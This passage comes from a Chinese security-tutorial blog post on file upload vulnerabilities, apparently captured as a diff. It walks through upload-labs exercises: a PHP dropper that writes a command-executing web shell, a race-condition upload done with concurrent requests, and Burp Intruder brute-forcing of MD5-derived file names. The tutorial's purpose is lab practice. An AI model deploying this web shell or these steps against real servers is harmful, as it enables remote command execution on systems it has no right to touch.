+<p>3.当2回显200时关闭攻击，上一个目录下有666.php文件</p>
+<p>4.连接即可</p>
+<p>建一个666.php文件，666.php的木马程序：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">fputs</span>(<span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;../666.php&#x27;</span>,<span class="string">&#x27;w&#x27;</span>),<span class="string">&#x27;&lt;?php @system($_GET[a]); ?&gt;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="number">1</span>、<span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;../666.php&#x27;</span>,<span class="string">&#x27;w&#x27;</span>): 打开一个名为<span class="number">666</span>.php的文件以进行写操作。../表示在上一级目录中创建该文件。如果相对路径解析正确，并且脚本有足够的权限，它将尝试在服务器上创建或覆盖一个名为<span class="number">666</span>.php的文件。</span><br><span class="line"></span><br><span class="line"><span class="number">2</span>、<span class="title function_ invoke__">fputs</span>(...): 将文本写入文件。在这里，它将下一个参数中的内容写入<span class="number">666</span>.php文件。</span><br><span class="line"></span><br><span class="line"><span class="number">3</span>、<span class="string">&#x27;&lt;?php @system($_GET[a]); ?&gt;&#x27;</span>: 这是写入文件的内容。它是一个PHP脚本，它使用@system函数执行通过GET参数传递的系统命令。具体来说，它使用<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]中传递的参数执行系统命令。</span><br></pre></td></tr></table></figure>
+
+<p>将该文件上传，使用yakit抓包，将重复发包和并发进程修改为下图</p>
+<p><img src="https://raw.githubusercontent.com/luyuguohhh/tuku/main/imj/QQ%E6%88%AA%E5%9B%BE20240109192444.png" alt="QQ截图20240109192444"></p>
+<p>然后我们访问一下造马的马，yakit抓包，发到测试器中</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.86.140/upload-labs-master/upload-labs-master/upload/666.php</span><br></pre></td></tr></table></figure>
+
+<p>设置如图</p>
+<p><img src="https://raw.githubusercontent.com/luyuguohhh/tuku/main/imj/QQ%E6%88%AA%E5%9B%BE20240109192801.png" alt="QQ截图20240109192801"></p>
+<p>将两个测试包都点击发送</p>
+<p>第二个测试包有200出现时，即我们的实验成功了，成功上传了木马文件</p>
+<p><img src="https://raw.githubusercontent.com/luyuguohhh/tuku/main/imj/QQ%E6%88%AA%E5%9B%BE20240109193207.png" alt="QQ截图20240109193207"></p>
+<p>在我们的目录下也出现了666.php文件</p>
+<p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202401201955836.png" alt="QQ截图20240109193257"></p>
+<h3><span id="文件上传题目">文件上传题目</span></h3><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202401201955121.png" alt="QQ截图20240110163715"></p>
+<p><code>$fullpath=&#39;/&#39;.md5($filename.$randnum).&quot;.&quot;.substr($filename,strripos($filename,&#39;.&#39;)+1);</code>: 这一行构造了上传文件的完整路径。让我解释这个过程：</p>
+<ul>
+<li><p><code>md5($filename.$randnum)</code>: 将原始文件名和生成的随机数连接起来，然后对连接后的字符串进行 MD5 散列。这是为了生成一个相对短且唯一的字符串，用作文件名的一部分。</p>
+</li>
+<li><p><code>&quot;.&quot;.substr($filename,strripos($filename,&#39;.&#39;)+1)</code>: 获取原始文件名中最后一个点（.）后的文件扩展名。<code>strripos</code> 函数用于获取字符串中指定子字符串最后一次出现的位置，然后 <code>substr</code> 用于获取该位置之后的子字符串。这样构建的字符串包含了文件的扩展名（比如 <code>.jpg</code> 或 <code>.txt</code>）。</p>
+</li>
+<li><p><code>&#39;/&#39;.md5($filename.$randnum).&quot;.&quot;.substr($filename,strripos($filename,&#39;.&#39;)+1)</code>: 将上述两部分字符串连接在一起，再在前面加上斜杠 <code>/</code>，形成完整的文件路径。</p>
+</li>
+</ul>
+<p>点击一下（上传文件的路径）</p>
+<p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202401201955712.png" alt="QQ截图20240110164528"></p>
+<p>我们上传一个625.php的文件，使用burp抓包一下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">phpinfo();</span><br><span class="line">?&gt;                    //看php版本信息</span><br></pre></td></tr></table></figure>
+
+
+
+<p>所以我们访问的文件路径是</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">192.168.2.114/upload/625.php</span><br></pre></td></tr></table></figure>
+
+<p>burp抓包一下</p>
+<p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202401201955747.png" alt="QQ截图20240110164739"></p>
+<p>发送到Intruder，在625的位置添加payload位置$</p>
+<p><img src="https://raw.githubusercontent.com/luyuguohhh/tuku/main/imj/QQ%E6%88%AA%E5%9B%BE20240110164910.png" alt="QQ截图20240110164910"></p>
+<p>设置payload，它的范围是1-9999</p>
+<p><img src="https://raw.githubusercontent.com/luyuguohhh/tuku/main/imj/QQ%E6%88%AA%E5%9B%BE20240110165102.png" alt="QQ截图20240110165102"></p>
+<p>根据上面的代码提示，我们需要添加一个前缀625.php和MD5加密</p>
+<p><img src="https://raw.githubusercontent.com/luyuguohhh/tuku/main/imj/QQ%E6%88%AA%E5%9B%BE20240110165234.png" alt="QQ截图20240110165234"></p>
+<p>开始攻击</p>
+<p><img src="https://raw.githubusercontent.com/luyuguohhh/tuku/main/imj/QQ%E6%88%AA%E5%9B%BE20240110165525.png" alt="QQ截图20240110165525"></p>
+<p><img src="https://raw.githubusercontent.com/luyuguohhh/tuku/main/imj/QQ%E6%88%AA%E5%9B%BE20240110165626.png" alt="QQ截图20240110165626"></p>
+
+      
+    </div>
+    <div class="article-footer">
+      <blockquote class="mt-2x">
+  <ul class="post-copyright list-unstyled">
+    
+    <li class="post-copyright-link hidden-xs">
+      <strong>本文链接：</strong>
+      <a href="http://example.com/2024/01/20/%E4%B8%89%E5%8D%81%E5%85%AB%EF%BC%8C%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" title="三十八，文件上传漏洞" target="_blank" rel="external">http://example.com/2024/01/20/三十八，文件上传漏洞/</a>
+    </li>
+    
+    <li class="post-copyright-license">
+      <strong>版权声明： </strong> 本博客所有文章除特别声明外，均采用 <a href="http://creativecommons.org/licenses/by/4.0/deed.zh" target="_blank" rel="external">CC BY 4.0 CN协议</a> 许可协议。转载请注明出处！
+    </li>
+  </ul>
+</blockquote>
+
+
+<div class="panel panel-default panel-badger">
+  <div class="panel-body">
+    <figure class="media">
+      <div class="media-left">
+        <a href="https://github.com/baiQstar" target="_blank" class="img-burn thumb-sm visible-lg">
+          <img src="/images/avatar.jpg" class="img-rounded w-full" alt="">
+        </a>
+      </div>
+      <div class="media-body">
+        <h3 class="media-heading"><a href="https://github.com/baiQstar" target="_blank"><span class="text-dark">白易安</span><small class="ml-1x">往事如叶，飘散随风</small></a></h3>
+        <div>个人简介。</div>
+      </div>
+    </figure>
+  </div>
+</div>
+
+
+    </div>
+  </article>
+  
+    
+  <section id="comments">
+  	
+      <div id="vcomments"></div>
+    
+  </section>
+
+
+  
+</div>
+
+  <nav class="bar bar-footer clearfix" data-stick-bottom>
+  <div class="bar-inner">
+  
+  <ul class="pager pull-left">
+    
+    <li class="prev">
+      <a href="/2024/01/20/%E4%B8%89%E5%8D%81%E4%B9%9D%EF%BC%8C%E7%9B%AE%E5%BD%95%E6%89%AB%E6%8F%8F%E9%9D%B6%E6%9C%BA/" title="三十九，目录扫描靶机"><i class="icon icon-angle-left" aria-hidden="true"></i><span>&nbsp;&nbsp;上一篇</span></a>
+    </li>
+    
+    
+    <li class="next">
+      <a href="/2024/01/08/%E4%B8%89%E5%8D%81%E4%B8%83%EF%BC%8CLinux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/" title="三十七，Linux基础命令"><span>下一篇&nbsp;&nbsp;</span><i class="icon icon-angle-right" aria-hidden="true"></i></a>
+    </li>
+    
+    
+  </ul>
+  
+  
+  <!-- Button trigger modal -->
+  <button type="button" class="btn btn-fancy btn-donate pop-onhover bg-gradient-warning" data-toggle="modal" data-target="#donateModal"><span>赏</span></button>
+  <!-- <div class="wave-icon wave-icon-danger btn-donate" data-toggle="modal" data-target="#donateModal">
+    <div class="wave-circle"><span class="icon"><i class="icon icon-bill"></i></span></div>
+  </div> -->
+  
+  
+  <div class="bar-right">
+    
+    <div class="share-component" data-sites="weibo,qq,wechat,facebook,twitter" data-mobile-sites="weibo,qq,qzone"></div>
+    
+  </div>
+  </div>
+</nav>
+  
+<!-- Modal -->
+<div class="modal modal-center modal-small modal-xs-full fade" id="donateModal" tabindex="-1" role="dialog">
+  <div class="modal-dialog" role="document">
+    <div class="modal-content donate">
+      <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">&times;</span></button>
+      <div class="modal-body">
+        <div class="donate-box">
+          <div class="donate-head">
+            <p>感谢您的支持，我会继续努力的!</p>
+          </div>
+          <div class="tab-content">
+            <div role="tabpanel" class="tab-pane fade active in" id="alipay">
+              <div class="donate-payimg">
+                <img src="/images/donate/alipayimg.png" alt="扫码支持" title="扫一扫" />
+              </div>
+              <p class="text-muted mv">扫码打赏，你说多少就多少</p>
+              <p class="text-grey">打开支付宝扫一扫，即可进行扫码打赏哦</p>
+            </div>
+            <div role="tabpanel" class="tab-pane fade" id="wechatpay">
+              <div class="donate-payimg">
+                <img src="/images/donate/wechatpayimg.png" alt="扫码支持" title="扫一扫" />
+              </div>
+              <p class="text-muted mv">扫码打赏，你说多少就多少</p>
+              <p class="text-grey">打开微信扫一扫，即可进行扫码打赏哦</p>
+            </div>
+          </div>
+          <div class="donate-footer">
+            <ul class="nav nav-tabs nav-justified" role="tablist">
+              <li role="presentation" class="active">
+                <a href="#alipay" id="alipay-tab" role="tab" data-toggle="tab" aria-controls="alipay" aria-expanded="true"><i class="icon icon-alipay"></i> 支付宝</a>
+              </li>
+              <li role="presentation" class="">
+                <a href="#wechatpay" role="tab" id="wechatpay-tab" data-toggle="tab" aria-controls="wechatpay" aria-expanded="false"><i class="icon icon-wepay"></i> 微信支付</a>
+              </li>
+            </ul>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+
+
+</main>
+
+  <footer class="footer" itemscope itemtype="http://schema.org/WPFooter">
+	
+	
+    <ul class="social-links">
+    	
+        <li><a href="https://github.com/baiQstar" target="_blank" title="Github" data-toggle=tooltip data-placement=top><i class="icon icon-github"></i></a></li>
+        
+        <li><a href="http://weibo.com/cofess" target="_blank" title="Weibo" data-toggle=tooltip data-placement=top><i class="icon icon-weibo"></i></a></li>
+        
+        <li><a href="https://twitter.com/iwebued" target="_blank" title="Twitter" data-toggle=tooltip data-placement=top><i class="icon icon-twitter"></i></a></li>
+        
+        <li><a href="https://www.behance.net/cofess" target="_blank" title="Behance" data-toggle=tooltip data-placement=top><i class="icon icon-behance"></i></a></li>
+        
+        <li><a href="/atom.xml" target="_blank" title="Rss" data-toggle=tooltip data-placement=top><i class="icon icon-rss"></i></a></li>
+        
+    </ul>
+
+    <div class="copyright">
+    	
+        <div class="publishby">
+        	Theme by <a href="https://github.com/cofess" target="_blank"> cofess </a>base on <a href="https://github.com/cofess/hexo-theme-pure" target="_blank">pure</a>.
+        </div>
+    </div>
+</footer>
+  <script src="//cdn.jsdelivr.net/npm/jquery@1.12.4/dist/jquery.min.js"></script>
+<script>
+window.jQuery || document.write('<script src="js/jquery.min.js"><\/script>')
+</script>
+
+<script src="/js/plugin.min.js"></script>
+
+
+<script src="/js/application.js"></script>
+
+
+    <script>
+(function (window) {
+    var INSIGHT_CONFIG = {
+        TRANSLATION: {
+            POSTS: '文章',
+            PAGES: '页面',
+            CATEGORIES: '分类',
+            TAGS: '标签',
+            UNTITLED: '(未命名)',
+        },
+        ROOT_URL: '/',
+        CONTENT_URL: '/content.json',
+    };
+    window.INSIGHT_CONFIG = INSIGHT_CONFIG;
+})(window);
+</script>
+
+<script src="/js/insight.js"></script>
+
+
+
+
+
+
+   
+
+
+
+
+   
+    
+  <script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/valine"></script>
+  <script type="text/javascript">
+  var GUEST = ['nick', 'mail', 'link'];
+  var meta = 'nick,mail,link';
+  meta = meta.split(',').filter(function(item) {
+    return GUEST.indexOf(item) > -1;
+  });
+  new Valine({
+    el: '#vcomments',
+    verify: false,
+    notify: false,
+    appId: '',
+    appKey: '',
+    placeholder: 'Just go go',
+    avatar: 'mm',
+    meta: meta,
+    pageSize: '10' || 10,
+    visitor: false
+  });
+  </script>
+
+     
+
+
+
+
+
+
+
+</body>
+</html>
